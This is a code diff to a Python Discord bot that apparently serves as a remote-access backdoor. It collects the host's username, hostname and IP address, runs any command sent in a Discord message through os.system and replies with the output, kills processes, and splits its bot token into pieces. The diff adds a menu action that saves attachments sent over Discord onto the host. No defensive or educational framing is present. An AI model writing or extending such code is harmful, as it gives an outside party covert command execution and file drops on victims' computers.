@@ -19,15 +19,17 @@ try:
 except:
 	os.system("py -m pip install discord-py-slash-command")
 finally:
-	from discord_slash import SlashCommand
+	from discord_slash import SlashCommand, SlashContext, ComponentContext
 	from discord_slash.utils.manage_commands import create_option
+	from discord_slash.model import ContextMenuType
+	from discord_slash.utils.manage_components import create_select, create_select_option, wait_for_component, create_actionrow
 
 
 pcuser=os.environ['username']
 hostname=socket.gethostname()
 IPA=socket.gethostbyname(hostname)
 
-projects = ["kopier.pyw", "liv.pyw", "rc.pyw"]
+projects = ["kopier.pyw", "liv.pyw"]
 
 TOKEN = ''
 parts={'p1':'ODcyNDY2NDA5MjQwODAxMzQx',
@@ -131,12 +133,6 @@ async def on_message(message):
 						except FileNotFoundError:
 							print("Working Directory not found:", new_directory)
 							await message.reply("Working Directory not found: "+new_directory)
-				if user_input.startswith("relax "):
-					new_time = int(user_input[6:])
-					with open("relax.json", "w") as f:
-						f.write(json.dumps({"time": new_time}, indent=4))
-					await message.reply(f"Relax_time changed to {new_time}")
-					await message.send("[INFO] Ensure working directory")
 				else:
 					os.system(user_input+" > OS_output.log 2> OS_err.log")  # Execute other commands
 					with open("OS_output.log", "r") as f:
@@ -324,5 +320,21 @@ async def taskkil(ctx, pid: int, isforce: bool = False):
 				await ctx.reply(content)
 		else:
 			await ctx.reply("EMPTY STRING")
+
+@slash.context_menu(
+	target=ContextMenuType.MESSAGE,
+	name="Save Attachments"
+)
+async def save_attachments(ctx: SlashContext):
+	# Get the target message
+	message = ctx.target_message
+	if ctx.target_message.channel.category == pcuser:
+		if message.attachments:
+			for attachment in message.attachments:
+				file_path = os.path.join(os.getcwd(), attachment.filename)
+				await attachment.save(file_path)
+				await ctx.send(content=f'File saved at: {os.path.abspath(file_path)}')
+		else:
+			await ctx.send(content="No attachments found in the selected message.")
 
 bot.run(TOKEN)
